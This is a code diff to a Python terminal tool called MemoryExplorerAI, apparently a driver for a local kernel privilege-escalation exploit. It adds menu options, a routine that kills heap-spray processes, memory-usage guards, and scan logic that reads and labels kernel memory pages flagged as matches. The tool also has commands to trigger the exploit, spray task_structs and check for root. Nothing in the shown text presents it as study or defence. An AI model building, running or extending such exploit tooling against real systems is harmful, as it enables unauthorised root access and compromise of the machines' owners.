@@ -153,7 +153,8 @@ class MemoryExplorerAI:
             print(f"{i:<3} | {item['type']:<15} | {item['description']:<35} | {item['va']:<12}")
         
         print("\n" + "="*75)
-        print("[E] Trigger Exploit  [S] Start Scan  [P] Spray  [R] Check Root  [Q] Quit")
+        print("[E] Trigger Exploit  [S] Start Scan  [P] Spray  [C] Clear Sprays")
+        print("[R] Check Root       [B] Rebuild     [Q] Quit   [ID] View Details")
         
     def trigger_exploit(self):
         if self.exploit_proc:
@@ -168,7 +169,21 @@ class MemoryExplorerAI:
                 break
         time.sleep(1)
 
+    def clear_sprays(self):
+        print(f"[*] Terminating {len(self.spray_procs)} spray processes...")
+        for pid in self.spray_procs:
+            try: os.kill(pid, 9)
+            except: pass
+        self.spray_procs = []
+        print("[+] RAM should be recovering now.")
+        time.sleep(1)
+
     def run_spray(self, count=2000):
+        if self.get_ram_usage() > 75.0:
+            print("[!] RAM usage too high to spray! Clear sprays first.")
+            time.sleep(1)
+            return
+            
         print(f"[*] Spraying {count} task_structs...")
         import ctypes
         import ctypes.util
@@ -334,6 +349,13 @@ class MemoryExplorerAI:
             elif cmd == 'p':
                 self.run_spray()
                 self.render_tui()
+            elif cmd == 'c':
+                self.clear_sprays()
+                self.render_tui()
+            elif cmd == 'b':
+                self.try_compile_engine()
+                input("Press Enter...")
+                self.render_tui()
             elif cmd == 's':
                 if not self.exploit_proc:
                     print("[!] Trigger exploit [E] first!")
@@ -362,15 +384,22 @@ class MemoryExplorerAI:
                     for line in proc.stdout:
                         # Real-time RAM monitoring during scan
                         ram = self.get_ram_usage()
-                        if ram > 70.0:
-                            print(f"\n[!] HIGH RAM DETECTED ({ram:.1f}%). Throttling scan...")
-                            time.sleep(2)
+                        if ram > 85.0:
+                            print(f"\n[!] CRITICAL RAM ({ram:.1f}%). Stopping scan!")
+                            proc.terminate()
+                            break
                             
-                        if line.startswith("MATCH:"):
+                        if "MATCH_" in line:
                             va = int(line.split(":")[1], 16)
                             page_data = self.read_page(va)
                             if page_data:
                                 res = self.classify_page(page_data, va)
+                                # If it's a KETO match but not classified, mark it specially
+                                if "MATCH_KETO" in line and res['type'] == "Unknown":
+                                    res['type'] = "Task Marker"
+                                    res['description'] = "KETO Signal Found"
+                                    res['confidence'] = 0.95
+                                
                                 self.found_items.append(res)
                                 self.render_tui()
                                 print(f"[*] Found candidate at {hex(va)}")
